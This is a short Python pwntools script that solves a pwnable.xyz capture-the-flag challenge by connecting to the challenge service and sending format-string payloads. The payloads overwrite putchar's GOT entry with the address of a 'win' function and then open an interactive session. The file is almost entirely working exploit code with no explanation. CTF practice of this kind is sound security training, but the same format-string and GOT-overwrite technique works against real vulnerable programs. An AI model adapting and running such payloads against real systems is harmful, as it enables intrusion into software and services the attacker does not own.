from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30013)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def concat(name):
	init(1)
	print(target.recvuntil(": "))
	target.sendline(name)

def edit(desc):
	init(2)
	print(target.recvuntil(": "))
	target.sendline(desc)

def leak():
	init(3)
	leaks=target.recvline().strip("\n")
	return leaks
		

print(target.recvuntil(": "))
putchar_got=0x602020
win=0x094c
name="%"+str(putchar_got)+"x"+"%6$ln"
desc="%"+str(win)+"x"+"%36$hn"
target.sendline(name)
print(target.recvuntil(": "))
target.sendline(desc)

leak()

target.interactive()

	
